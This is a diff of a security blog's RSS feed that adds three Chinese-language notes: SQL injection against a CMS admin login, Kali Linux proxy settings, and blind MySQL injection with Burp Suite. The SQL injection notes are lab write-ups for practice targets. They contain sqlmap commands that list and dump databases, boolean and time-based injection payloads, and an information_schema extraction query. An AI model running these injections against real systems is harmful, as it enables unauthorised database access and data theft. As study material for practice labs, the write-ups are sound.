@@ -7,9 +7,126 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>null</copyright>
-    <lastBuildDate>Fri, 02 Feb 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 12 Feb 2024 00:00:00 +0000</lastBuildDate>
     
         <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>熊海 CMS 后台登录的 SQL 注入</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
+        <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
+        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;h2 id=&#34;手工注入&#34;&gt;手工注入&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-4.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;用-sqlmap-扫描&#34;&gt;用 sqlmap 扫描&lt;/h2&gt;
+&lt;p&gt;使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;ndash;dbs 的意思是列出所有数据库名称&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch -D flag_db --dump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;-D 是指定数据库，&amp;ndash;dump 是以文件形式导出。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-0.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-1.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-2.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/sqli4/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Kali Linux 网络设置</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</link>
+        <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</guid>
+        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/kalinetwork/ -&lt;p&gt;连不上网的时候可以用如下指令。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;dhclient -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/linux/kali_ip.png&#34; alt=&#34;kaliifconfig&#34;&gt;&lt;/p&gt;
+&lt;p&gt;代理走本机的话可以用本机开 clash。&lt;/p&gt;
+&lt;p&gt;创建脚本。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+# encoding: utf-8
+
+Proxy_IP=192.168.1.1
+Proxy_Port=8080
+
+# Set System Proxy
+function xyon(){
+    export https_proxy=http://$Proxy_IP:$Proxy_Port
+    export http_proxy=http://$Proxy_IP:$Proxy_Port
+    export all_proxy=socks5://$Proxy_IP:$Proxy_Port
+    echo -e &amp;quot;System Proxy is $Proxy_IP:$Proxy_Port&amp;quot;
+}
+
+# unSet System Proxy
+function xyoff(){
+    unset all_proxy
+    unset https_proxy
+    unset http_proxy
+    echo -e &amp;quot;System Proxy is Disabled&amp;quot;
+}
+
+# Default Function is Set Proxy
+if [ $# != 0 ]
+then
+    if [ $1 == &#39;off&#39; ]
+    then
+	    xyoff
+    elif [ $1 == &#39;on&#39; ]
+    then
+	    xyon
+    else
+	    echo &amp;quot;Please Input on or off!&amp;quot;
+    fi
+else
+    echo &amp;quot;Please input command.&amp;quot;
+fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;调用脚本。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x setproxy.sh
+
+source setproxy.sh on
+
+source setproxy.sh off&lt;/code&gt;&lt;/pre&gt;
+- https://xxxhidexxx.github.io/posts/sec/kalinetwork/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>用 Burp Suite 跑 MySQL 盲注</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/sqli3/</link>
+        <pubDate>Wed, 07 Feb 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/sqli3/</guid>
+        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli3/ -&lt;h2 id=&#34;提要&#34;&gt;提要&lt;/h2&gt;
+&lt;p&gt;盲注就是存在注入点但是看不到回显点。这通常有两种情况，或者是输入 &lt;code&gt;?id=1&#39; and 1=2 --+&lt;/code&gt; 能看到报错页面，或者是输入 &lt;code&gt;?id=1&#39; and sleep(3) --+&lt;/code&gt; 回车能看到网页延迟刷新。这里 sleep(3) 延迟的不一定是三秒也可能是 3 的倍数，因为 sleep 可能被执行了不止一次。数据库一般都有延时函数，例如 mysql 的 sleep()，这种注入方法一般称为时间盲注。在页面没有任何明确显示的情况下，把响应时间作为一种显示，这个想法很有趣，然而，在现实场景中时间盲注成本比较高，运算量可能比较大，不是很稳定，除非一定要爆破，应该谨慎考虑这个选择。&lt;/p&gt;
+&lt;p&gt;我们这里主要演示的是用 burp 脚本进行爆破。如果手工注入的话语句的 = 改成 &amp;gt; 然后使用二分法就可以了，也没什么好讲的。&lt;/p&gt;
+&lt;p&gt;在做这个靶场的时候我们发现 burp 跑出来的时间盲注结果和自己手工测试的不一样。相同的测试语句，手工的结果是正确的，但是 burp 的响应时间比较抽象，还不知道原因。&lt;/p&gt;
+&lt;p&gt;用 burp 跑有报错的布尔盲注倒是很顺利，如下所述。&lt;/p&gt;
+&lt;h2 id=&#34;演示&#34;&gt;演示&lt;/h2&gt;
+&lt;p&gt;还是用之前的靶场进行测试。首先用 &lt;code&gt;&#39; and 1=2 --+&lt;/code&gt; 找到注入点。看到页面报错。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-4.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;打开 burp 抓包后发送到 intruder，选择集束炸弹。选中要遍历的参数之后点击添加 payload。我们两个的 payload 点位分别是 ascii 和字符串位数，所以类型都选择数值，ascii 我们直接从 1 跑到 128。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-0.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击 attack 按钮之后可以看到响应包的长度有不同，比较长的就说明是正常显示的。我们把不报错的 ascii 码依次解码得到数据库名 webug。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-1.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后可以进一步爆破表名和字段名找到 flag。语句的写法例如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&amp;gt;1 --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;讲一下 sql 语法。这里的 substr 的用法是 substr(object,start,length) 所以 start 遍历 1~n，然后 length 永远写 1。这里 limit 0,1 的意思是从第 0 项开始查询 1 项，所以是第一个参数遍历 0~n，第二个参数恒为 1。&lt;/p&gt;
+&lt;p&gt;后面重复劳动不是很重要懒得写了。&lt;/p&gt;
+&lt;p&gt;然后我们用时间盲注跑一下看看，得到下述结果，响应时间对不上，原因未知，应该是 burp 的问题。&lt;/p&gt;
+&lt;p&gt;我们的语句用手工测试的结果没有问题，语法肯定是对的。也讲一下这个语法，if(e1,e2,e3) 的意思是，如果 e1 是对的就执行 e2，否则执行 e3。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-5.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli3-6.png&#34; alt=&#34;sqli3&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/sqli3/ - null</description>
+        </item>
     
     
     
@@ -61,7 +178,7 @@
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
         <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli1/ -&lt;p&gt;对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&lt;/p&gt;
-&lt;p&gt;靶场界面如下。&lt;/p&gt;
+&lt;p&gt;webug 4.0 的联合注入靶场界面如下。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-0.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;首先在 id 参数之后加单引号进行尝试。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-1.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
